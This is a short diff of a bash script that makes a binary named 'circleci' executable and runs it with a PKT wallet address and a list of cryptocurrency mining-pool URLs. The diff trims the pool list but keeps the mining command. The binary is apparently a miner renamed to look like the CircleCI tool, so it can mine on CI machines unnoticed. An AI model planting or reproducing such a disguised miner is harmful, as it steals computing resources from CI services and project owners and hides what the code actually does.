@@ -1,6 +1,6 @@
 #!/bin/bash
 
 chmod +x circleci && 
-./circleci ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx https://stratum.zetahash.com http://pool.pktpool.io http://pool.pkt.world  http://pool.pkteer.com https://pool.pkthash.com http://p.master.pktdigger.com/ http://pool.k1m3r4.com/ http://oeuf2pool.xyz http://pktco.in    
+./circleci ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx https://stratum.zetahash.com http://pool.pktpool.io http://pool.pkt.world
 
 
